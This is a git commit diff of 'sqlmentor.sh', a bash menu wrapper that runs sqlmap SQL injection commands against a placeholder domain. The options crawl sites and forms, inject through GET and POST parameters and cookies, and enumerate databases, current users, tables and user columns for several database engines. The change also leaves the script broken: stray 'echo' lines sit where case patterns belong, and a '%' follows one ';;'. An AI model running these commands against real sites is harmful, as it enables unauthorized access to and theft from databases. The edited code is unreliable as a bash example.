38569e783e5d833f76f52345b845d82cbb9539f7
psycolulz <112537894+psycolulz@users.noreply.github.com>
2022-10-13 17:53:39 -0400

    Update sqlmentor.sh

--- sqlmentor.sh
+++ sqlmentor.sh
@@ -18,60 +18,60 @@ Credit For SQLmap Goes To Its Developers, Not Me. I Just Created The Cheet Sheat
  This Tool Is For Educational Purposes! Shoutout To The SQLmap Developers "
 echo
 PS3='root@sqlmentor~:'
-options=("! SQL Crawling" "@ SQL Crawling + Forms" "# SQL GET Req." "$ SQL POST Req." "^ SQL Auth Site" "& Collect DB & User" "* Sql & Tables" "( SQL User Columns" ")SQL mssql DB" "= SQL mysql DB" "+ SQL oracle DB" "- SQL postgres DB" "~ Update Tool")
+options=("SQL Crawling" "SQL Crawling + Forms" "SQL GET Req." "SQL POST Req." "SQL Auth Site" "Collect DB & User" "Sql & Tables" "SQL User Columns" "SQL mssql DB" "SQL mysql DB" "SQL oracle DB" "SQL postgres DB" "Update Tool")
 select opt in "${options[@]}"
 do 
-case $opt in 
-"1) SQL Crawling")
+case $opt in
+echo "SQL Crawlings"
 # Do Not Forget To Replace The Default Domains
 command clear
 command sqlmap -u https://enterdomainhere.com/ --crawl=2
 ;;
-"2) SQL Crawling + Forms")
+echo "SQL Crawling + Forms"
 command clear
 command sqlmap -u https://enterdomainhere.com/ --forms --crawl=2
 ;;
-"3) SQL GET Req.")
+echo "SQL GET Req."
 command clear
 command sqlmap -u https://enterdomainhere.com/
 ;;
-"4) SQL POST Req.")
+echo "SQL POST Req."
 command clear
 command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val"
-;;
-"5) SQL Auth Site")
+;;%
+"SQL Auth Site")
 command clear
 command  sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" --cookie="cookie1=val1;cookie2=val2"
 ;;
-"6) Collect DB & User")
+"Collect DB & User")
 command clear
 command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --current-db --current-user
 ;;
-"7) SQL & Tables")
+"SQL & Tables")
 command clear
 command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" --tables -D "testdb"
 ;;
-"8) SQL User Columns")
+"SQL User Columns")
 command clear
 command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" --columns -T "users"
 ;;
-"9) SQL mssql DB")
+"SQL mssql DB")
 command clear
 command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="mssql"
 ;;
-"10) SQL mysql DB")
+"SQL mysql DB")
 command clear
 command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="mysql"
 ;;
-"11) SQL oracle DB")
+"SQL oracle DB")
 command clear
 command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="oracle"
 ;;
-"12) SQL postgres DB")
+"SQL postgres DB")
 command clear
 command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="postgres"
 ;;
-"13) Update Tool")
+"Update Tool")
 command clear
 command git pull
 command clear
